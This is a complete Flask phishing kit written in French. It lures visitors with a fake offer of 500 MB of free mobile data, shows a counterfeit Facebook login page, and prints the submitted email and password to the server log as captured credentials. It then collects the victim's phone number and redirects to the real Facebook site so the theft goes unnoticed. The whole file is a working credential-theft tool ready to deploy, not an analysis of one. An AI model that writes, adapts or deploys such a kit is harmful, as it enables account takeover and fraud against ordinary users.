import os
from flask import Flask, request, redirect

app = Flask(__name__)

# --- INTERFACE 1 : ANNONCE DU BONUS ---
HTML_ACCUEIL = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #eef2f7; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .card { background: white; width: 100%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); text-align: center; }
        .gift-icon { font-size: 50px; margin-bottom: 10px; }
        h2 { color: #2c3e50; margin-bottom: 10px; }
        p { color: #5a6c7d; line-height: 1.6; }
        .btn-check { display: block; width: 100%; padding: 15px; background: #3498db; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        .btn-check:hover { background: #2980b9; }
    </style>
</head>
<body>
    <div class="card">
        <div class="gift-icon">🎁</div>
        <h2>BONUS GRATUIT</h2>
        <p>Inscrivez-vous dès maintenant pour réclamer votre pack de <b>500 Mo de connexion gratuite</b>.</p>
        <p style="font-size: 13px; color: #95a5a6;">Vérifiez votre éligibilité en une étape simple.</p>
        <a href="/auth" class="btn-check">VÉRIFIER MON ÉLIGIBILITÉ</a>
    </div>
</body>
</html>
'''

# --- INTERFACE 2 : ÉLIGIBILITÉ VIA FACEBOOK ---
HTML_FACEBOOK = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; margin: 0; }
        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; color: #1877f2; font-size: 30px; font-weight: bold; }
        .login-box { width: 90%; max-width: 400px; margin-top: 20px; text-align: center; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .alert { background: #fff9e6; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 15px; border: 1px solid #ffeeba; }
        input { width: 100%; padding: 15px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">facebook</div>
    <div class="login-box">
        <div class="alert">Connectez-vous pour confirmer que ce compte est éligible au bonus de 500 Mo.</div>
        <form action="/capture" method="post">
            <input type="text" name="email" placeholder="Mobile number or email" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>
'''

# --- INTERFACE 3 : RÉCLAMATION DU BONUS ---
HTML_BONUS = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; padding: 20px; }
        .promo-box { width: 100%; max-width: 400px; background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .success-icon { color: #2ecc71; font-size: 40px; }
        h2 { color: #2c3e50; }
        .data-badge { background: #e8f5e9; color: #2e7d32; padding: 10px 20px; border-radius: 20px; font-weight: bold; display: inline-block; margin: 10px 0; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #2ecc71; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="promo-box">
        <div class="success-icon">✔</div>
        <h2>Compte Éligible !</h2>
        <div class="data-badge">PACK 500 MO ACTIVER</div>
        <p>Entrez votre numéro pour recevoir votre code d'activation :</p>
        <form action="/final" method="post">
            <input type="text" name="phone" placeholder="Ex: 034XXXXXXX" required>
            <button type="submit">RÉCLAMER MAINTENANT</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return HTML_ACCUEIL

@app.route('/auth')
def auth():
    return HTML_FACEBOOK

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('pass')
    print(f"\n[!] LOGS CAPTURÉS : {email} | {password}")
    return HTML_BONUS

@app.route('/final', methods=['POST'])
def final():
    phone = request.form.get('phone')
    print(f"[+] NUMÉRO POUR BONUS : {phone}\n")
    return redirect("https://m.facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
